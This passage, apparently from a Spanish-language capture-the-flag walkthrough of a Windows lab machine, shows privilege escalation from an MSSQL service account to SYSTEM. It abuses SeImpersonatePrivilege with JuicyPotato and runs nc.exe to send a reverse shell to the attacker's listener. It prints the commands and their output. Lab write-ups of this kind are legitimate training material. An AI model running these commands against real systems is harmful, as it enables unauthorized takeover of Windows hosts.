[Info] Type "help" to get a list of the available prompt commands.
[Info] Http Server started on port 8080.
[Important] Awaiting payload execution to initiate shell session...
[Shell] Payload execution verified!
[Shell] Stabilizing command prompt...

PS C:\Windows\system32 > whoami
breach\svc_mssql

PS C:\Windows\system32 >
```

## Privilege Escalation

- Bueno, encontramos el **SeImpersonatePrivilege** que podemos explotar fácilmente.

```bash
PS C:\Windows\system32 > whoami /all
USER INFORMATION
----------------

User Name        SID
================ =============================================
breach\svc_mssql S-1-5-21-2330692793-3312915120-706255856-1115


GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                                             Attributes                            
========================================== ================ =============================================================== ==================================================
Everyone                                   Well-known group S-1-1-0                                                         Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                                    Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                                    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                       Well-known group S-1-5-6                                                         Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                              Well-known group S-1-2-1                                                         Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                                        Mandatory group, Enabled by default, Enabled group
NT SERVICE\MSSQL$SQLEXPRESS                Well-known group S-1-5-80-3880006512-4290199581-1648723128-3569869737-3631323133 Enabled by default, Enabled group, Group owner
LOCAL                                      Well-known group S-1-2-0                                                         Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                                     Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288                                                                                          


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.

PS C:\Windows\system32 >
```

- Pues bueno, para esto, como ya sabemos, podemos usar el siguiente recurso: <https://github.com/antonioCoco/JuicyPotatoNG/releases>.

- Simplemente, nos descargamos eso y también enviamos el netcat a la máquina víctima descargándolo con curl.

```bash
PS C:\ProgramData > dir
Directory: C:\ProgramData


Mode                 LastWriteTime         Length Name                           
----                 -------------         ------ ----                           
d-----         2/10/2022  12:59 AM                Amazon                         
d-----         3/10/2024   6:09 PM                docker                         
d---s-         2/17/2022  10:26 AM                Microsoft                      
d-----         2/17/2022  10:27 AM                Package Cache                  
d-----         3/10/2024   6:32 PM                regid.1991-06.com.microsoft    
d-----          5/8/2021   8:20 AM                SoftwareDistribution           
d-----          5/8/2021   9:36 AM                ssh                            
d-----         9/15/2021   3:11 AM                USOPrivate                     
d-----          5/8/2021   8:20 AM                USOShared                      
-a----         3/10/2024  10:13 PM         153600 JuicyPotato.exe                
-a----         3/10/2024  10:15 PM          28160 nc.exe

PS C:\ProgramData > .\JuicyPotato.exe -t * -p "C:\ProgramData\nc.exe" -a '10.8.1.127 443 -e cmd'
```

- Recibimos la Shell.

```bash
➜  ~ sudo rlwrap nc -nlvp 443
[sudo] password for miguel:
listening on [any] 443 ...
connect to [10.8.1.127] from (UNKNOWN) [10.10.90.80] 59266
Microsoft Windows [Version 10.0.20348.558]
(c) Microsoft Corporation. All rights reserved.

C:\>whoami
whoami
nt authority\system

C:\>cd C:\Users\Administrator\Desktop
cd C:\Users\Administrator\Desktop

C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is B465-02B6

 Directory of C:\Users\Administrator\Desktop

02/17/2022  10:51 AM    <DIR>          .
02/17/2022  09:35 AM    <DIR>          ..
02/17/2022  10:52 AM                36 root.txt
               1 File(s)             36 bytes
               2 Dir(s)  11,751,800,832 bytes free

C:\Users\Administrator\Desktop>
```
